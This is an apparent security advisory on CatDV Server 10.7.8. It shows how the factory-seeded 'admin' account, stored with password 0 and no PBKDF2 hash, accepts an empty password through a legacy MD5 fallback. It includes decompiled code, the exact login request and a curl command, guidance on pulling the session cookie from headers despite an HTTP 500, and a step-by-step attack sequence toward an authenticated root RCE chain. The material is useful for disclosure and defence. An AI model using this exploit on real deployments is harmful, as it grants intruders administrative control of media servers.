# CatDV Server Factory-Default Empty Admin Password - Technical Analysis

## Overview

CatDV Server 10.7.8 is a closed-source broadcast media asset management (MAM) server from Square Box Systems (UK; MAM business acquired by Quantum), built on Java 17 with an embedded Tomcat 9.0.106, an RMI registry on port 1099, a web/REST API on port 8181, and a MySQL backend. The REST login endpoint `POST /catdv/api/1/session` (handled by `SessionHandler.processPost`) authenticates users against the `c_user` table. The factory DB seed `create_catdv.sql:294` creates the built-in `admin` user with `password=0` and `passwordHash=NULL`. The password verification routine `Encryption.a(password, passwordHash, storedPassword)` skips the PBKDF2 path when `passwordHash` is `null` and falls back to a legacy `simpleMD5Hash` path, where `simpleMD5Hash("")` returns `0` and `0 == storedPassword(0)` evaluates to true. The result is that anyone who can reach the login endpoint can authenticate as `admin` with an empty password, as long as the factory default has not been changed. The Nashorn script engine (removed in Java 17) breaks the JSON response body serialization and produces an HTTP 500, but the `Set-Cookie` headers that prove the login are set before body serialization, so the authentication succeeds and is verifiable from the headers alone.

## Architecture

```
L1 external access: Web 8181 (embedded Tomcat, catdv.war REST /catdv/api/*)
L2 boundary: HTTP on 8181
L3 gateway: CatDVRestService (REST dispatch /catdv/api/*)
L4 auth: SessionHandler (JSESSIONID + catdv_authenticated_user cookie)
L5 business: SessionHandler.processPost (login) + admin-gated handlers (ClipHandler/SettingsHandler/AAFExportHandler/...)
L6 storage: MySQL c_user table (id/name/password/passwordHash) + JVM session store
```

The login endpoint `SessionHandler.processPost` is `requiresIdentity=false` (the login endpoint itself does not require a prior identity). All other admin-gated handlers are `requiresIdentity=true` and require a valid `JSESSIONID` + `catdv_authenticated_user` cookie issued by a successful login.

## Authentication Boundary

| Port | Service | Auth model |
|------|---------|------------|
| 8181 | REST /catdv/api/* | JSESSIONID + catdv_authenticated_user cookie (SessionHandler) |

`SessionHandler.processPost` reads `username` and `password` from the request, looks up the user in `c_user`, and calls `Encryption.a(password, user.passwordHash, user.password)`. On success it sets `JSESSIONID` and `catdv_authenticated_user=<username>` cookies and marks the session authenticated.

## Sink: The Admin Session

A successful login issues:

```
Set-Cookie: JSESSIONID=<id>; Path=/catdv; HttpOnly
Set-Cookie: catdv_authenticated_user=admin; Path=/catdv; HttpOnly
```

The `JSESSIONID` is the admin session and grants access to every `requiresIdentity=true` admin handler, including the AAF export handler that is the exec sink in the authenticated RCE chain. The `catdv_authenticated_user=admin` cookie is the proof that the server accepted the login.

## Source: The Factory-Default DB Seed

`create_catdv.sql:294` (the CatDV factory DB seed):

```sql
INSERT INTO c_user VALUES(0,-1,'admin','Administrator',0,0,NULL,0);
--                          ^id ^grp ^name ^desc  ^pw ^hash ^...
-- password=0, passwordHash=NULL (factory default)
```

The `c_user` table schema: `password` (int, the `simpleMD5Hash` value), `passwordHash` (varchar, the PBKDF2 strengthened hash; NULL means not set). The factory seed leaves `passwordHash` NULL and `password` at 0.

## Data Flow: The Login Verification

### SessionHandler.processPost

```java
// SessionHandler.java (CFR decompilation)
public void processPost(CatDVRestRequestContext ctx) {
    String username = ctx.getParameter("username");
    String password = ctx.getParameter("password");
    User user = E.c(ctx, username);                    // look up c_user row
    if (user == null) { error("Unknown user"); return; }
    if (!Encryption.a(password, user.passwordHash, user.password)) {
        error("Bad password"); return;
    }
    // issue admin session
    ctx.setAuthenticatedUser(user);
    ctx.setJsessionId(...);
}
```

### Encryption.a — passwordHash==null skips PBKDF2

```java
// Encryption.java (CFR decompilation)
public static boolean a(String password, String passwordHash, int storedPassword) {
    if (passwordHash != null && passwordHash.length() > 0) {
        // PBKDF2 strengthened path (factory default not set, skipped)
        String hash = pbkdf2(password, passwordHash_salt);
        return hash.equals(passwordHash);
    }
    // fall back to the legacy simpleMD5Hash path
    int n4 = simpleMD5Hash(password);      // simpleMD5Hash("") = 0
    return n4 == storedPassword;           // 0 == 0 -> true
}
```

### simpleMD5Hash("") = 0

```java
public static int simpleMD5Hash(String s) {
    if (s == null || s.length() == 0) return 0;     // <- empty string returns 0
    byte[] md5 = MessageDigest.getInstance("MD5").digest(s.getBytes());
    return ByteBuffer.wrap(md5).getInt();           // take first 4 bytes
}
```

**Empty password -> `simpleMD5Hash("")=0` -> `0 == 0` (storedPassword=0) -> true.** The login succeeds without the attacker supplying any credential beyond the well-known username `admin`.

## Login Request Construction

```
POST /catdv/api/1/session HTTP/1.1
Host: 127.0.0.1:8181
Content-Type: application/json
CatDV-Client: web

{"username":"admin","password":""}
```

Nashorn (removed in Java 17) breaks the JSON response body serialization -> HTTP 500, **but the login has already succeeded** (the `Set-Cookie` headers are set before body serialization):

```
HTTP/1.1 500
Set-Cookie: JSESSIONID=BDE2B824315859C730DB377D1FD13717; Path=/catdv; HttpOnly
Set-Cookie: catdv_authenticated_user=admin; Path=/catdv; HttpOnly
```

**Key point**: do not rely on the response body to judge the login result. Extract `JSESSIONID` and `catdv_authenticated_user=admin` from the `Set-Cookie` header; their presence proves admin authentication succeeded. The HTTP 500 is a body-serialization failure caused by the missing Nashorn script engine, not a login failure.

## Dynamic Verification

Request issued against the target-side `127.0.0.1:8181`:

```bash
curl -s -D /tmp/hdr.txt -o /dev/null -X POST http://127.0.0.1:8181/catdv/api/1/session \
  -H 'Content-Type: application/json' -H 'CatDV-Client: web' \
  -d '{"username":"admin","password":""}'
```

Response headers:

```
HTTP/1.1 500
Set-Cookie: JSESSIONID=BDE2B824315859C730DB377D1FD13717; Path=/catdv; HttpOnly
Set-Cookie: catdv_authenticated_user=admin; Path=/catdv; HttpOnly
```

`catdv_authenticated_user=admin` proves the admin login succeeded with an empty password. A direct DB query against the seeded `c_user` row confirms the factory default (not a research-configured value):

```sql
SELECT id,name,password,passwordHash FROM c_user WHERE name='admin';
+----+------+----------+--------------+
| id | name | password | passwordHash |
+----+------+----------+--------------+
|  0 | admin|        0 | NULL         |
+----+------+----------+--------------+
```

`password=0, passwordHash=NULL` is the `create_catdv.sql:294` factory default.

## Reachability

| Entry / condition | Default? |
|------|----------|
| Web 8181 /catdv/api/1/session reachable | yes (CatDV default web port) |
| admin user exists | yes (create_catdv.sql:294 factory seed) |
| admin password=0 / passwordHash=NULL | yes (factory default, not research-configured) |
| Encryption.a empty-password legacy fallback | yes (default logic) |

**Reachable under default config as long as the admin password has not been changed.** This is a factory-default credentials issue.

## Exploitation Prerequisites (Honest Disclosure)

This is a default-credentials issue. The single precondition is that the deployment has not changed the factory-default `admin` password.

| Entry / condition | Default? | Notes |
|---|---|---|
| Web 8181 reachable | yes (CatDV default web port) | typically reached via the server host |
| admin user exists | yes (create_catdv.sql:294 factory seed) | built-in administrator |
| admin password=0 / passwordHash=NULL | yes (factory default) | the credential being exploited |
| Encryption.a legacy fallback on null passwordHash | yes (default logic) | the verification bypass |
| simpleMD5Hash("")=0 | yes (default logic) | the empty-string fixed return |

**On deployments where the admin password has been changed** (so `passwordHash` is set to a real PBKDF2 hash), this specific credential issue is not exploitable: `Encryption.a` takes the PBKDF2 path and the empty password does not match. The underlying legacy fallback and `simpleMD5Hash("")=0` behavior remain as a latent weakness for any account that ever has a null `passwordHash`.

## Complete Attack Sequence

1. **Reach the login endpoint**: connect to the CatDV web port (8181 by default) on the target host.
2. **Submit the factory-default empty admin password**: `POST /catdv/api/1/session` with body `{"username":"admin","password":""}` and header `CatDV-Client: web`.
3. **Extract the admin cookies from the Set-Cookie header**: parse `JSESSIONID` and `catdv_authenticated_user=admin` from the response headers (not the body; the HTTP 500 body is a Nashorn serialization failure, not a login failure).
4. **Use the admin session**: the `JSESSIONID` + `catdv_authenticated_user=admin` cookies grant access to every admin-gated handler, including the AAF export handler that is the exec sink in the authenticated RCE chain.

## Key Technical Insights

1. **The factory seed leaves admin with no real password**: `create_catdv.sql:294` inserts `admin` with `password=0, passwordHash=NULL`. The `passwordHash` column is the PBKDF2 hash; NULL means the strengthened path is never taken for the factory admin.

2. **`Encryption.a` falls back to a legacy 32-bit MD5 path when `passwordHash` is null**: the PBKDF2 branch is gated on `passwordHash != null && passwordHash.length() > 0`; a null hash skips it entirely and falls back to `simpleMD5Hash`.

3. **`simpleMD5Hash` returns a fixed 0 for the empty string**: `if (s == null || s.length() == 0) return 0;`. Combined with the factory seed `password=0`, an empty password produces `0 == 0` and the login succeeds.

4. **The HTTP 500 is a red herring**: Nashorn (removed in Java 17) breaks the JSON response body serialization, but the `Set-Cookie` headers are set before body serialization. The login must be judged from the headers, not the body or the HTTP status code.

5. **This is the credential prerequisite for the authenticated RCE chain**: the admin session it grants is the gate for the AAF export handler that reaches `ProcessUtils.exec` as root. On deployments where the admin password has been changed, this credential issue is closed, but the legacy fallback remains a latent weakness.

## Credits

Discovered by 0day Rubbish Project using automated AI vulnerability research with multi-LLM ensemble (Claude, OpenAI, DeepSeek, GLM).

---

*Disclaimer: This research was conducted for defensive purposes. Always obtain proper authorization before testing systems you don't own. Responsible disclosure practices apply.*
